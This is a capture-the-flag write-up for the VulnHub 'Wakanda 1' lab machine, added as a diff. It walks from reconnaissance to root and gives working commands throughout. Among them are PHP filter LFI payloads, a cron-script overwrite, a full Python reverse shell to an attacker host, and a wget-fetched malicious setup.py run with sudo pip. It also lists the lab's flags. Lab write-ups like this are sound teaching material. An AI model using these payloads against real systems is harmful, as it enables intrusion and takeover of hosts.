@@ -1,0 +1,430 @@
+================================================================================
+Wakanda CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/wakanda-1,251/
+================================================================================
+
+OBJECTIVE: Find 3 hidden keys (flag1.txt, flag2.txt, root.txt)
+DIFFICULTY: Intermediate
+TARGET IP: 10.0.2.12
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Network scan
+nmap -sC -sV -p- 10.0.2.12
+
+Open Ports:
+  80/tcp   - open (HTTP)
+  111/tcp  - open (RPCBIND)
+  3333/tcp - open (SSH)
+
+# Key observation
+SSH running on non-standard port 3333 - potential access point
+
+================================================================================
+[2] WEB APPLICATION ANALYSIS
+================================================================================
+
+# Initial web enumeration
+curl http://10.0.2.12/
+
+# Source code inspection
+view-source:http://10.0.2.12/ → Line 29
+<!-- <a class="nav-link active" href="?lang=fr">Fr</a> -->
+
+# LFI vulnerability testing
+http://10.0.2.12/?lang=fr
+
+# PHP filter exploitation attempts
+http://10.0.2.12/?lang=php://filter/read=string.rot13/resource=index.php
+http://10.0.2.12/?lang=php://filter/convert.base64-encode/resource=index.php
+
+# Successful payload (case sensitivity bypass)
+http://10.0.2.12/?lang=pHp://FilTer/convert.base64-encode/resource=index
+
+Result: Large base64-encoded output containing source code
+
+================================================================================
+[3] CREDENTIAL DISCOVERY
+================================================================================
+
+# Decode base64 output
+echo "<base64_string>" > base64.txt
+base64 -d base64.txt
+
+# Source code analysis revealed hardcoded credentials
+<?php
+$password ="Niamey4Ever227!!!" ;//I have to remember it
+
+if (isset($_GET['lang']))
+{
+    include($_GET['lang'].".php");
+}
+?>
+
+Discovered Credentials:
+  Password: Niamey4Ever227!!!
+  Potential Users: mamadou, root
+
+================================================================================
+[4] INITIAL ACCESS
+================================================================================
+
+# SSH connection attempt
+ssh mamadou@10.0.2.12 -p 3333
+Password: Niamey4Ever227!!!
+
+# Unexpected behavior: Python interactive shell
+>>> whoami
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'whoami' is not defined
+
+>>> ls
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'ls' is not defined
+
+# Shell upgrade to bash
+>>> import pty; pty.spawn("/bin/bash")
+mamadou@Wakanda1:~$
+
+# First flag location
+mamadou@Wakanda1:~$ pwd
+/home/mamadou
+
+mamadou@Wakanda1:~$ ls -l
+total 4
+-rw-r--r-- 1 mamadou mamadou 41 Aug  1  2018 flag1.txt
+
+mamadou@Wakanda1:~$ cat flag1.txt
+Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
+
+FLAG 1: d86b9ad71ca887f4dd1dac86ba1c4dfc
+
+================================================================================
+[5] LATERAL MOVEMENT
+================================================================================
+
+# Sudo privilege check
+mamadou@Wakanda1:~$ sudo -l
+[sudo] password for mamadou: 
+Sorry, user mamadou may not run sudo on Wakanda1.
+
+# Locate second flag
+mamadou@Wakanda1:~$ locate flag2.txt
+/home/devops/flag2.txt
+
+# Enumerate home directories
+mamadou@Wakanda1:~$ ls -la /home
+total 16
+drwxr-xr-x  4 root    root    4096 Aug  1  2018 .
+drwxr-xr-x 22 root    root    4096 Aug  1  2018 ..
+drwxr-xr-x  2 devops  devops  4096 Aug  1  2018 devops
+drwxr-xr-x  2 mamadou mamadou 4096 Aug  1  2018 mamadou
+
+mamadou@Wakanda1:~$ ls -la /home/devops
+total 12
+drwxr-xr-x 2 devops devops 4096 Aug  1  2018 .
+drwxr-xr-x 4 root   root   4096 Aug  1  2018 ..
+-r-------- 1 devops devops   41 Aug  1  2018 flag2.txt
+
+# Search for devops-owned files
+mamadou@Wakanda1:~$ find / -user devops 2>/dev/null
+/srv/.antivirus.py
+/tmp/test
+/home/devops
+/home/devops/.bashrc
+/home/devops/.profile
+/home/devops/.bash_logout
+/home/devops/flag2.txt
+
+# Analyze suspicious files
+mamadou@Wakanda1:~$ cat /tmp/test
+test
+
+mamadou@Wakanda1:~$ cat /srv/.antivirus.py
+open('/tmp/test', 'w').write('test')
+
+# Observation: Script appears to run as cron job under devops user
+
+# Exploit cron job to read flag2
+mamadou@Wakanda1:~$ echo "open('/tmp/test', 'w').write(open('/home/devops/flag2.txt').read())" > /srv/.antivirus.py
+
+# Wait for cron execution, then read result
+mamadou@Wakanda1:~$ cat /tmp/test
+Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
+
+FLAG 2: d8ce56398c88e1b4d9e5f83e64c79098
+
+================================================================================
+[6] PRIVILEGE ESCALATION - DEVOPS USER
+================================================================================
+
+# Deploy reverse shell via cron job
+# Start listener on attacker machine
+nc -nvlp 1234
+listening on [any] 1234 ...
+
+# Write Python reverse shell to antivirus.py
+mamadou@Wakanda1:~$ cat > /srv/.antivirus.py << 'EOF'
+import os 
+import socket
+import subprocess
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.2.6", 1234))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p=subprocess.call(["/bin/sh", "-i"])
+EOF
+
+# Connection received on attacker machine
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.12] 33886
+/bin/sh: 0: can't access tty; job control turned off
+
+$ whoami
+devops
+
+# Stabilize shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+devops@Wakanda1:/$
+
+================================================================================
+[7] PRIVILEGE ESCALATION - ROOT ACCESS
+================================================================================
+
+# Check sudo permissions
+devops@Wakanda1:/$ sudo -l
+Matching Defaults entries for devops on Wakanda1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User devops may run the following commands on Wakanda1:
+    (ALL) NOPASSWD: /usr/bin/pip
+
+# Critical finding: pip executable with NOPASSWD sudo access
+
+# Exploit using FakePip technique
+# Repository: https://github.com/0x00-0x00/FakePip
+
+# Attacker machine - Start HTTP server
+python3 -m http.server --bind 10.0.2.6
+Serving HTTP on 10.0.2.6 port 8000 ...
+
+# Attacker machine - Start listener for root shell
+nc -nvlp 13372
+listening on [any] 13372 ...
+
+# Target machine - Download malicious setup.py
+devops@Wakanda1:/tmp$ wget http://10.0.2.6:8000/setup.py
+devops@Wakanda1:/tmp$ ls
+setup.py
+flag2.txt
+
+# Install malicious package with sudo
+devops@Wakanda1:/tmp$ sudo /usr/bin/pip install . --upgrade --force-reinstall
+
+# Root connection received
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.12] 45821
+
+# whoami
+root
+
+# python -c 'import pty; pty.spawn("/bin/bash")'
+root@Wakanda1:~#
+
+================================================================================
+[8] ROOT FLAG CAPTURE
+================================================================================
+
+root@Wakanda1:~# pwd
+/root
+
+root@Wakanda1:~# ls -la
+total 28
+drwx------  3 root root 4096 Aug  1  2018 .
+drwxr-xr-x 22 root root 4096 Aug  1  2018 ..
+-rw-------  1 root root    0 Aug  1  2018 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Aug  1  2018 .cache
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  305 Aug  1  2018 root.txt
+
+root@Wakanda1:~# cat root.txt
+
+ _    _.--.____.--._
+( )=.-":;:;:;;':;:;:;"-._
+ \\\:;:;:;:;:;;:;::;:;:;:\
+  \\\:;:;:;:;:;;:;:;:;:;:;\
+   \\\:;::;:;:;:;:;::;:;:;:\
+    \\\:;:;:;:;:;;:;::;:;:;:\
+     \\\:;::;:;:;:;:;::;:;:;:\
+      \\\;;:;:_:--:_:_:--:_;:;\
+       \\\_.-"             "-._\
+        \\
+         \\
+          \\
+           \\ Wakanda 1 - by @xMagass
+            \\
+             \\
+
+
+Congratulations You are Root!
+
+821ae63dbe0c573eff8b69d451fb21bc
+
+FLAG 3: 821ae63dbe0c573eff8b69d451fb21bc
+
+================================================================================
+[9] FLAGS SUMMARY
+================================================================================
+
+Flag 1: d86b9ad71ca887f4dd1dac86ba1c4dfc  (Location: /home/mamadou/flag1.txt)
+Flag 2: d8ce56398c88e1b4d9e5f83e64c79098  (Location: /home/devops/flag2.txt)
+Flag 3: 821ae63dbe0c573eff8b69d451fb21bc  (Location: /root/root.txt)
+
+================================================================================
+[10] VULNERABILITIES EXPLOITED
+================================================================================
+
+1. Local File Inclusion (LFI)
+   - PHP filter abuse allowed source code extraction
+   - Case sensitivity bypass required for exploitation
+
+2. Hardcoded Credentials
+   - Password stored in plain text within application source
+   - Comment indicates developer awareness of poor practice
+
+3. Restricted Shell Misconfiguration
+   - Python shell intended as restriction but easily bypassed
+   - PTY module allowed full bash shell access
+
+4. Insecure Cron Job Implementation
+   - World-writable script executed with elevated privileges
+   - No input validation or integrity checks
+
+5. Sudo Misconfiguration
+   - Package manager (pip) allowed with NOPASSWD
+   - Enables arbitrary code execution as root
+
+6. Weak Access Controls
+   - Insufficient file permission restrictions
+   - Sensitive scripts accessible to low-privilege users
+
+================================================================================
+[11] ATTACK CHAIN SUMMARY
+================================================================================
+
+LFI vulnerability discovery
+    ↓
+PHP filter base64 encoding
+    ↓
+Source code disclosure
+    ↓
+Hardcoded password extraction (Niamey4Ever227!!!)
+    ↓
+SSH access on port 3333 (Python shell)
+    ↓
+Shell upgrade via PTY spawn
+    ↓
+Flag 1 capture (/home/mamadou/)
+    ↓
+File enumeration (find / -user devops)
+    ↓
+Cron job discovery (/srv/.antivirus.py)
+    ↓
+Cron job abuse (read flag2.txt)
+    ↓
+Flag 2 capture via cron execution
+    ↓
+Reverse shell deployment (Python payload)
+    ↓
+Devops user access obtained
+    ↓
+Sudo enumeration (pip NOPASSWD)
+    ↓
+FakePip exploitation
+    ↓
+Root shell acquisition
+    ↓
+Flag 3 capture (/root/root.txt)
+    ↓
+Complete system compromise
+
+================================================================================
+[12] TOOLS USED
+================================================================================
+
+- Nmap 7.98          : Network scanning and service enumeration
+- curl               : HTTP requests and file retrieval
+- base64             : Decoding encoded content
+- OpenSSH            : Remote access client
+- Python 2.7/3.x     : Shell stabilization (PTY module)
+- Netcat             : Reverse shell listener
+- FakePip            : Pip privilege escalation exploit
+- find               : File system enumeration
+- wget               : File download utility
+
+================================================================================
+[13] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. Input Validation
+   - Implement strict input validation for all user-supplied parameters
+   - Use whitelist approach for file inclusion operations
+   - Sanitize and validate all GET/POST parameters
+
+2. Credential Management
+   - Never hardcode credentials in application source code
+   - Use environment variables or secure credential stores
+   - Implement regular credential rotation policies
+
+3. Shell Configuration
+   - Properly configure restricted shells or disable them entirely
+   - Use specialized tools (rbash, lshell) if shell restriction is required
+   - Monitor and log all shell access attempts
+
+4. Cron Job Security
+   - Set strict file permissions on cron scripts (750 or 700)
+   - Implement file integrity monitoring for automated scripts
+   - Use absolute paths and validate all script inputs
+
+5. Sudo Configuration
+   - Avoid NOPASSWD for package managers and interpreters
+   - Implement least privilege principle for sudo access
+   - Regular audit of sudoers file and sudo permissions
+   - Use sudo logging and monitoring
+
+6. Access Controls
+   - Implement proper file permission schemes (principle of least privilege)
+   - Regular security audits of SUID/SGID binaries
+   - Monitor world-writable files and directories
+
+7. General Security
+   - Keep all software and packages updated
+   - Implement intrusion detection systems
+   - Regular vulnerability assessments
+   - Security awareness training for developers
+
+================================================================================
+[14] REFERENCES
+================================================================================
+
+- VulnHub Wakanda VM: https://www.vulnhub.com/entry/wakanda-1,251/
+- FakePip Repository: https://github.com/0x00-0x00/FakePip
+- HackTricks LFI: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/
+- GTFOBins Pip: https://gtfobins.github.io/gtfobins/pip/
+- OWASP Top 10: https://owasp.org/www-project-top-ten/
+
+================================================================================
+[15] DISCLAIMER
+================================================================================
+
+This writeup is for educational purposes only. All techniques demonstrated
+should only be used on systems you own or have explicit permission to test.
+Unauthorized access to computer systems is illegal.
+
+================================================================================
